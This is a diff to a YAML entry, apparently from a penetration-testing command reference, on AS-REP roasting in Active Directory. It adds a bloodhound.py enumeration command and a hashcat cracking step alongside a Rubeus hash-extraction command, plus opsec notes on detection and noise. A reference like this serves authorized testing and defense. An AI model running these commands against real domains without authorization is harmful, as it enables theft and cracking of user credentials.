@@ -13,7 +13,16 @@ commands:
 - '# Rubeus - target specific user'
 - Rubeus.exe asreproast /user:<TARGET_USER> /format:hashcat /outfile:hashes.txt
 - ''
-- '# Crack with hashcat'
+- '# bloodhound.py - collect users to find AS-REP targets'
+- bloodhound.py -u '<YOUR_USER>' -p '<YOUR_PASSWORD>' -d '<DOMAIN>' -dc '<DC_IP>' -c All
+- ''
+- '# Crack with hashcat (AS-REP)'
 - hashcat -m 18200 hashes.txt wordlist.txt
-opsec: []
-references: []
+opsec:
+- AS-REP requests generate Kerberos event 4768 (TGT Request)
+- Can be performed unauthenticated if username is known
+- DONT_REQ_PREAUTH is rare - presence may indicate old/forgotten accounts
+- Less noisy than Kerberoasting due to targeted nature
+references:
+- https://attack.mitre.org/techniques/T1558/004/
+- https://www.thehacker.recipes/ad/movement/kerberos/asreproast
